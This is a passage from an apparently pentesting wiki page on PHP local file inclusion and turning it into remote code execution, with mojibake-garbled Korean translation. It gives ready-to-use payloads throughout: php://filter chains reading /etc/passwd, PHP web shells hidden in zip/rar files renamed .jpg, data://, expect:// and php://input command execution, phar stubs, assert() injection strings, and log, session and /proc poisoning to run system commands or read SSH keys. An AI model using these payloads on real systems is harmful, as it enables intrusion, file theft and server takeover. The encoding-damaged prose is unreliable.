# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter" ë¶€ë¶„ì€ ëŒ€ì†Œë¬¸ìë¥¼ êµ¬ë¶„í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
{% endhint %}

### ì„ì˜ íŒŒì¼ì„ ì½ê¸° ìœ„í•œ ì˜¤ë¼í´ë¡œì„œ php í•„í„° ì‚¬ìš©í•˜ê¸°

[**ì´ ê²Œì‹œë¬¼ì—ì„œ**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) ì„œë²„ë¡œë¶€í„° ë°˜í™˜ëœ ì¶œë ¥ ì—†ì´ ë¡œì»¬ íŒŒì¼ì„ ì½ëŠ” ê¸°ìˆ ì´ ì œì•ˆë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ **php í•„í„°ë¥¼ ì˜¤ë¼í´ë¡œ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ì„ ë¶ˆë¦¬ì–¸ ë°©ì‹ìœ¼ë¡œ(ë¬¸ìë³„ë¡œ) ìœ ì¶œí•˜ëŠ” ê²ƒ**ì— ê¸°ë°˜í•©ë‹ˆë‹¤. ì´ëŠ” php í•„í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ í…ìŠ¤íŠ¸ë¥¼ ì¶©ë¶„íˆ í¬ê²Œ ë§Œë“¤ì–´ phpê°€ ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚¤ë„ë¡ í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

ì›ë³¸ ê²Œì‹œë¬¼ì—ì„œëŠ” ê¸°ìˆ ì— ëŒ€í•œ ìì„¸í•œ ì„¤ëª…ì„ ì°¾ì„ ìˆ˜ ìˆì§€ë§Œ, ì—¬ê¸° ê°„ë‹¨í•œ ìš”ì•½ì´ ìˆìŠµë‹ˆë‹¤:

* **`UCS-4LE`** ì½”ë±ì„ ì‚¬ìš©í•˜ì—¬ í…ìŠ¤íŠ¸ì˜ ì„ í–‰ ë¬¸ìë¥¼ ì‹œì‘ ë¶€ë¶„ì— ë‘ê³  ë¬¸ìì—´ì˜ í¬ê¸°ë¥¼ ê¸°í•˜ê¸‰ìˆ˜ì ìœ¼ë¡œ ì¦ê°€ì‹œí‚µë‹ˆë‹¤.
* ì´ëŠ” **ì´ˆê¸° ë¬¸ìê°€ ì˜¬ë°”ë¥´ê²Œ ì¶”ì¸¡ë˜ì—ˆì„ ë•Œ í…ìŠ¤íŠ¸ê°€ ë„ˆë¬´ ì»¤ì§€ë„ë¡** ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ phpê°€ **ì˜¤ë¥˜**ë¥¼ ë°œìƒì‹œí‚µë‹ˆë‹¤.
* **dechunk** í•„í„°ëŠ” **ì²« ë²ˆì§¸ ë¬¸ìê°€ 16ì§„ìˆ˜ê°€ ì•„ë‹ ê²½ìš° ëª¨ë“  ê²ƒì„ ì œê±°**í•˜ë¯€ë¡œ ì²« ë²ˆì§¸ ë¬¸ìê°€ 16ì§„ìˆ˜ì¸ì§€ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì´ê²ƒì€ ì´ì „ì˜ ê²ƒê³¼ ê²°í•©ë˜ì–´(ì¶”ì¸¡ëœ ë¬¸ìì— ë”°ë¼ ë‹¤ë¥¸ í•„í„°ë„ ì‚¬ìš©ë¨) í…ìŠ¤íŠ¸ì˜ ì‹œì‘ ë¶€ë¶„ì—ì„œ ë¬¸ìë¥¼ ì¶”ì¸¡í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì¶©ë¶„í•œ ë³€í™˜ì„ ìˆ˜í–‰í•˜ì—¬ 16ì§„ìˆ˜ ë¬¸ìê°€ ì•„ë‹Œ ê²½ìš°ë¥¼ í™•ì¸í•©ë‹ˆë‹¤. 16ì§„ìˆ˜ì¸ ê²½ìš° dechunkëŠ” ì‚­ì œí•˜ì§€ ì•Šìœ¼ë©° ì´ˆê¸° í­íƒ„ì´ php ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚µë‹ˆë‹¤.
* **convert.iconv.UNICODE.CP930** ì½”ë±ì€ ê° ë¬¸ìë¥¼ ë‹¤ìŒ ë¬¸ìë¡œ ë³€í™˜í•©ë‹ˆë‹¤(ì˜ˆ: ì´ ì½”ë± ì´í›„: a -> b). ì´ë¥¼ í†µí•´ ì²« ë²ˆì§¸ ë¬¸ìê°€ `a`ì¸ì§€ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì´ ì½”ë±ì„ 6ë²ˆ ì ìš©í•˜ë©´ a->b->c->d->e->f->gê°€ ë˜ì–´ ë¬¸ìê°€ ë” ì´ìƒ 16ì§„ìˆ˜ ë¬¸ìê°€ ì•„ë‹ˆê²Œ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ dechunkëŠ” ì‚­ì œí•˜ì§€ ì•Šìœ¼ë©° php ì˜¤ë¥˜ê°€ ì´ˆê¸° í­íƒ„ê³¼ ê³±í•´ì ¸ ë°œìƒí•©ë‹ˆë‹¤.
* **rot13**ê³¼ ê°™ì€ ë‹¤ë¥¸ ë³€í™˜ì„ ì‹œì‘ ë¶€ë¶„ì— ì‚¬ìš©í•˜ë©´ n, o, p, q, rê³¼ ê°™ì€ ë‹¤ë¥¸ ë¬¸ìë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ë‹¤ë¥¸ ì½”ë±ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ë¬¸ìë¥¼ 16ì§„ìˆ˜ ë²”ìœ„ë¡œ ì´ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
* ì´ˆê¸° ë¬¸ìê°€ ìˆ«ìì¼ ê²½ìš° base64ë¡œ ì¸ì½”ë”©í•˜ê³  ìˆ«ìë¥¼ ìœ ì¶œí•˜ê¸° ìœ„í•´ ì²˜ìŒ ë‘ ë¬¸ìë¥¼ ìœ ì¶œí•´ì•¼ í•©ë‹ˆë‹¤.
* ìµœì¢… ë¬¸ì œëŠ” **ì´ˆê¸° ë¬¸ì ì´ìƒì„ ìœ ì¶œí•˜ëŠ” ë°©ë²•**ì„ ë³´ëŠ” ê²ƒì…ë‹ˆë‹¤. **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**ì™€ ê°™ì€ ìˆœì„œ ë©”ëª¨ë¦¬ í•„í„°ë¥¼ ì‚¬ìš©í•˜ë©´ ë¬¸ìì˜ ìˆœì„œë¥¼ ë³€ê²½í•˜ê³  í…ìŠ¤íŠ¸ì˜ ì²« ë²ˆì§¸ ìœ„ì¹˜ì— ë‹¤ë¥¸ ë¬¸ìë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì¶”ê°€ ë°ì´í„°ë¥¼ ì–»ê¸° ìœ„í•´ì„œëŠ” **ì´ˆê¸° ë¶€ë¶„ì— 2ë°”ì´íŠ¸ì˜ ì“°ë ˆê¸° ë°ì´í„°ë¥¼ ìƒì„±**í•˜ê³  **convert.iconv.UTF16.UTF16**ì„ ì ìš©í•œ í›„ **UCS-4LE**ë¥¼ ì‚¬ìš©í•˜ì—¬ **ë‹¤ìŒ 2ë°”ì´íŠ¸ì™€ í”¼ë²—**ì„ ë§Œë“¤ê³ , **ì“°ë ˆê¸° ë°ì´í„°ê¹Œì§€ ë°ì´í„°ë¥¼ ì‚­ì œ**í•©ë‹ˆë‹¤(ì´ê²ƒì€ ì´ˆê¸° í…ìŠ¤íŠ¸ì˜ ì²˜ìŒ 2ë°”ì´íŠ¸ë¥¼ ì œê±°í•©ë‹ˆë‹¤). ì›í•˜ëŠ” ë¹„íŠ¸ë¥¼ ìœ ì¶œí•  ë•Œê¹Œì§€ ê³„ì† ì§„í–‰í•©ë‹ˆë‹¤.

ê²Œì‹œë¬¼ì—ì„œëŠ” ì´ë¥¼ ìë™ìœ¼ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ë„êµ¬ë„ ìœ ì¶œë˜ì—ˆìŠµë‹ˆë‹¤: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

ì´ ë˜í¼ëŠ” í”„ë¡œì„¸ìŠ¤ê°€ ì—´ì–´ë‘” íŒŒì¼ ì„¤ëª…ìì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì—´ë¦° íŒŒì¼ì˜ ë‚´ìš©ì„ ìœ ì¶œí•˜ëŠ” ë° ì ì¬ì ìœ¼ë¡œ ìœ ìš©í•©ë‹ˆë‹¤:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
You can also use **php://stdin, php://stdout and php://stderr** to access the **file descriptors 0, 1 and 2** respectively (not sure how this could be useful in an attack)

### zip:// and rar://

Zip ë˜ëŠ” Rar íŒŒì¼ì— PHPShellì„ í¬í•¨í•˜ì—¬ ì—…ë¡œë“œí•˜ê³  ì ‘ê·¼í•˜ì„¸ìš”.\
rar í”„ë¡œí† ì½œì„ ì•…ìš©í•  ìˆ˜ ìˆìœ¼ë ¤ë©´ **íŠ¹ë³„íˆ í™œì„±í™”ë˜ì–´ì•¼ í•©ë‹ˆë‹¤**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
ì´ í”„ë¡œí† ì½œì€ php êµ¬ì„±ì— ì˜í•´ ì œí•œë©ë‹ˆë‹¤ **`allow_url_open`** ë° **`allow_url_include`**

### expect://

ExpectëŠ” í™œì„±í™”ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST ë§¤ê°œë³€ìˆ˜ì— í˜ì´ë¡œë“œë¥¼ ì§€ì •í•˜ì„¸ìš”:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

`.phar` íŒŒì¼ì€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ íŒŒì¼ ë¡œë”©ì„ ìœ„í•´ `include`ì™€ ê°™ì€ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•  ë•Œ PHP ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë° í™œìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ì˜ PHP ì½”ë“œ ì¡°ê°ì€ `.phar` íŒŒì¼ì˜ ìƒì„±ì„ ë³´ì—¬ì¤ë‹ˆë‹¤:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` íŒŒì¼ì„ ì»´íŒŒì¼í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

LFIê°€ PHP ì½”ë“œ ì‹¤í–‰ ì—†ì´ íŒŒì¼ ì½ê¸°ë§Œ ìˆ˜í–‰í•˜ëŠ” ê²½ìš°, `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ë˜ëŠ” `filesize()`ì™€ ê°™ì€ í•¨ìˆ˜ë¥¼ í†µí•´ ì—­ì§ë ¬í™” ì·¨ì•½ì ì„ ì´ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ `phar` í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ì„ ì½ëŠ” ê²ƒê³¼ ê´€ë ¨ì´ ìˆìŠµë‹ˆë‹¤.

`.phar` íŒŒì¼ì˜ ë§¥ë½ì—ì„œ ì—­ì§ë ¬í™” ì·¨ì•½ì ì„ ì´ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ì´í•´ëŠ” ì•„ë˜ ë§í¬ëœ ë¬¸ì„œë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

**php í•„í„°ë¥¼ ì§€ì›í•˜ëŠ” ì„ì˜ì˜ íŒŒì¼ì„ ì½ëŠ” ê²ƒì„ ì•…ìš©í•˜ì—¬ RCEë¥¼ ì–»ëŠ” ê²ƒì´ ê°€ëŠ¥í–ˆìŠµë‹ˆë‹¤.** ìì„¸í•œ ì„¤ëª…ì€ [**ì´ ê²Œì‹œë¬¼ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
ë§¤ìš° ê°„ë‹¨í•œ ìš”ì•½: PHP í™ì—ì„œ **3 ë°”ì´íŠ¸ ì˜¤ë²„í”Œë¡œìš°**ê°€ ì•…ìš©ë˜ì–´ **íŠ¹ì • í¬ê¸°ì˜ ììœ  ì²­í¬ ì²´ì¸**ì„ ë³€ê²½í•˜ì—¬ **ì–´ë–¤ ì£¼ì†Œì—ë“  ì“¸ ìˆ˜ ìˆê²Œ** ë˜ì—ˆê³ , ê·¸ë˜ì„œ **`system`**ì„ í˜¸ì¶œí•˜ëŠ” í›„í¬ê°€ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.\
ë” ë§ì€ PHP í•„í„°ë¥¼ ì•…ìš©í•˜ì—¬ íŠ¹ì • í¬ê¸°ì˜ ì²­í¬ë¥¼ í• ë‹¹í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” ë©”ëª¨ë¦¬ ë˜ëŠ” ì„ì‹œ íŒŒì¼ì— ì“°ê¸° (íŒŒì¼ í¬í•¨ ê³µê²©ì—ì„œ ì–´ë–»ê²Œ ìœ ìš©í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì‹¤í•˜ì§€ ì•ŠìŒ)
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” ë¡œì»¬ íŒŒì¼ ì‹œìŠ¤í…œ ì ‘ê·¼
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” HTTP(s) URL ì ‘ê·¼
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” FTP(s) URL ì ‘ê·¼
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” ì••ì¶• ìŠ¤íŠ¸ë¦¼
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” íŒ¨í„´ê³¼ ì¼ì¹˜í•˜ëŠ” ê²½ë¡œ ì´ë¦„ ì°¾ê¸° (ì¸ì‡„ ê°€ëŠ¥í•œ ê²ƒì„ ë°˜í™˜í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ ì—¬ê¸°ì„œëŠ” ê·¸ë‹¤ì§€ ìœ ìš©í•˜ì§€ ì•ŠìŒ)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” ì˜¤ë””ì˜¤ ìŠ¤íŠ¸ë¦¼ (ì„ì˜ íŒŒì¼ ì½ê¸°ì— ìœ ìš©í•˜ì§€ ì•ŠìŒ)

## LFI via PHP's 'assert'

PHPì˜ 'assert' í•¨ìˆ˜ì™€ ê´€ë ¨ëœ Local File Inclusion (LFI) ìœ„í—˜ì€ íŠ¹íˆ ë¬¸ìì—´ ë‚´ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ìƒë‹¹íˆ ë†’ìŠµë‹ˆë‹¤. ì…ë ¥ì— ".."ì™€ ê°™ì€ ë””ë ‰í† ë¦¬ íƒìƒ‰ ë¬¸ìê°€ í¬í•¨ë˜ì–´ ìˆì§€ë§Œ ì œëŒ€ë¡œ ì •ë¦¬ë˜ì§€ ì•ŠëŠ” ê²½ìš° íŠ¹íˆ ë¬¸ì œê°€ ë©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, PHP ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë””ë ‰í† ë¦¬ íƒìƒ‰ì„ ë°©ì§€í•˜ë„ë¡ ì„¤ê³„ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
assert("strpos('$file', '..') === false") or die("");
```
ì´ê²ƒì€ íƒìƒ‰ì„ ì¤‘ì§€í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•˜ì§€ë§Œ, ì˜ë„ì¹˜ ì•Šê²Œ ì½”ë“œ ì£¼ì…ì„ ìœ„í•œ ë²¡í„°ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. íŒŒì¼ ë‚´ìš©ì„ ì½ê¸° ìœ„í•´ ì´ë¥¼ ì•…ìš©í•˜ë ¤ëŠ” ê³µê²©ìëŠ” ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
ìœ ì‚¬í•˜ê²Œ, ì„ì˜ì˜ ì‹œìŠ¤í…œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì— ëŒ€í•´ ê¹Šì´ ìˆëŠ” ì½˜í…ì¸ ì— ì°¸ì—¬í•˜ì„¸ìš”.

**Real-Time Hack News**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ì˜ ìµœì‹  ì •ë³´ë¥¼ ìœ ì§€í•˜ì„¸ìš”.

**Latest Announcements**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•œ ì •ë³´ë¥¼ ìœ ì§€í•˜ì„¸ìš”.

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## PHP Blind Path Traversal

{% hint style="warning" %}
ì´ ê¸°ìˆ ì€ **PHP í•¨ìˆ˜**ì˜ **íŒŒì¼ ê²½ë¡œ**ë¥¼ **ì œì–´**í•  ìˆ˜ ìˆëŠ” ê²½ìš°ì— ê´€ë ¨ì´ ìˆìœ¼ë©°, **íŒŒì¼ì— ì ‘ê·¼**í•˜ì§€ë§Œ íŒŒì¼ì˜ ë‚´ìš©ì„ ë³¼ ìˆ˜ ì—†ëŠ” ê²½ìš°(ì˜ˆ: **`file()`**ì— ëŒ€í•œ ê°„ë‹¨í•œ í˜¸ì¶œ)ì…ë‹ˆë‹¤.
{% endhint %}

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

As sumary, the technique is using the **"UCS-4LE" encoding** to make the content of a file so **big** that the **PHP function opening** the file will trigger an **error**.

Then, in order to leak the first char the filter **`dechunk`** is used along with other such as **base64** or **rot13** and finally the filters **convert.iconv.UCS-4.UCS-4LE** and **convert.iconv.UTF16.UTF-16BE** are used to **place other chars at the beggining and leak them**.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Remote File Inclusion

Explained previously, [**follow this link**](./#remote-file-inclusion).

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

{% hint style="warning" %}
Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.

Also, make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.
{% endhint %}

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### ì´ë©”ì¼ì„ í†µí•œ ë°©ë²•

**ë‚´ë¶€ ê³„ì •(user@localhost)ìœ¼ë¡œ ë©”ì¼ì„ ë³´ë‚´ê³ ** `<?php echo system($_REQUEST["cmd"]); ?>`ì™€ ê°™ì€ PHP í˜ì´ë¡œë“œë¥¼ í¬í•¨ì‹œí‚¤ê³  **`/var/mail/<USERNAME>`** ë˜ëŠ” **`/var/spool/mail/<USERNAME>`**ì™€ ê°™ì€ ê²½ë¡œë¡œ ì‚¬ìš©ìì˜ ë©”ì¼ì— í¬í•¨ì‹œí‚¤ë„ë¡ ì‹œë„í•©ë‹ˆë‹¤.

### /proc/\*/fd/\*ë¥¼ í†µí•œ ë°©ë²•

1. ë§ì€ ì‰˜ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤ (ì˜ˆ: 100ê°œ)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)ë¥¼ í¬í•¨ì‹œí‚¤ê³ , ì—¬ê¸°ì„œ $PIDëŠ” í”„ë¡œì„¸ìŠ¤ì˜ PID(ë¬´ì°¨ë³„ ëŒ€ì… ê°€ëŠ¥)ì´ê³  $FDëŠ” íŒŒì¼ ë””ìŠ¤í¬ë¦½í„°(ë¬´ì°¨ë³„ ëŒ€ì… ê°€ëŠ¥)ì…ë‹ˆë‹¤.

### /proc/self/environì„ í†µí•œ ë°©ë²•

ë¡œê·¸ íŒŒì¼ì²˜ëŸ¼, User-Agentì— í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ë©´ /proc/self/environ íŒŒì¼ ì•ˆì— ë°˜ì˜ë©ë‹ˆë‹¤.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### ì—…ë¡œë“œë¥¼ í†µí•œ ë°©ë²•

íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆë‹¤ë©´, ê·¸ ì•ˆì— ì‰˜ í˜ì´ë¡œë“œë¥¼ ì£¼ì…í•˜ì„¸ìš” (ì˜ˆ: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
íŒŒì¼ì„ ì½ê¸° ì‰½ê²Œ ìœ ì§€í•˜ê¸° ìœ„í•´ì„œëŠ” ì‚¬ì§„/doc/pdfì˜ ë©”íƒ€ë°ì´í„°ì— ì£¼ì…í•˜ëŠ” ê²ƒì´ ê°€ì¥ ì¢‹ìŠµë‹ˆë‹¤.

### Zip íŒŒì¼ ì—…ë¡œë“œë¥¼ í†µí•´

PHP ì…¸ì´ ì••ì¶•ëœ ZIP íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ì ‘ê·¼í•©ë‹ˆë‹¤:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

ì›¹ì‚¬ì´íŠ¸ê°€ PHP ì„¸ì…˜(PHPSESSID)ì„ ì‚¬ìš©í•˜ëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP ì´ëŸ¬í•œ ì„¸ì…˜ì€ _/var/lib/php5/sess\\_\[PHPSESSID]\_ íŒŒì¼ì— ì €ì¥ë©ë‹ˆë‹¤.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Set the cookie to `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFIë¥¼ ì‚¬ìš©í•˜ì—¬ PHP ì„¸ì…˜ íŒŒì¼ì„ í¬í•¨í•©ë‹ˆë‹¤.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

sshê°€ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´ ì–´ë–¤ ì‚¬ìš©ìê°€ ì‚¬ìš©ë˜ê³  ìˆëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤ (/proc/self/status & /etc/passwd) ê·¸ë¦¬ê³  **\<HOME>/.ssh/id\_rsa**ì— ì ‘ê·¼í•´ ë³´ì‹­ì‹œì˜¤.

### **Via** **vsftpd** _**logs**_

FTP ì„œë²„ vsftpdì˜ ë¡œê·¸ëŠ” _**/var/log/vsftpd.log**_ì— ìœ„ì¹˜í•©ë‹ˆë‹¤. Local File Inclusion (LFI) ì·¨ì•½ì ì´ ì¡´ì¬í•˜ê³  ë…¸ì¶œëœ vsftpd ì„œë²„ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ë‹¤ìŒ ë‹¨ê³„ë¥¼ ê³ ë ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

